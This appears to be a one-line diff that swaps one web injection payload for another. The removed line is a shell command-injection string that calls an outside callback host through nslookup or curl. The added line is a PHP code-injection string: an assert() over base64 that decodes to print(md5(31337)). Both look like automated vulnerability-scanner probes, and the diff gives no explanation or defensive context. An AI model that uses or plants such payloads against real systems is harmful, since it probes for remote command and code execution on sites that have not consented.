@@ -1,1 +1,1 @@
-(nslookup -q=cname hitqnmzqwprale1443.bxss.me||curl hitqnmzqwprale1443.bxss.me))
+;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));
